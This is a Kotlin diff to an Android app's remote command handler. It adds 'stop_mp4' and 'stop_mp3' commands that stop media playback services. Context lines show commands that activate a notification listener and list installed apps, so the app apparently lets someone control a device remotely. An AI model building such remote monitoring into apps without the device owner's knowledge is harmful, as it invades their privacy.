@@ -339,6 +339,25 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("type" to "text", "data" to "Notif listener aktif"))
             }
 
+// ============ STOP MP4 ============
+"stop_mp4" -> {
+    try {
+        ctx.stopService(Intent(ctx, VideoPlayerService::class.java))
+    } catch (_: Exception) {}
+    done(mapOf("ok" to true))
+}
+
+// ============ STOP MP3 ============
+"stop_mp3" -> {
+    try {
+        val i = Intent(ctx, AudioPlayerService::class.java).apply {
+            putExtra("stop", true)
+        }
+        ctx.startService(i)
+        ctx.stopService(i)
+    } catch (_: Exception) {}
+    done(mapOf("ok" to true))
+}
             // ============ LIST APPS ============
             "list_apps" -> {
                 try {
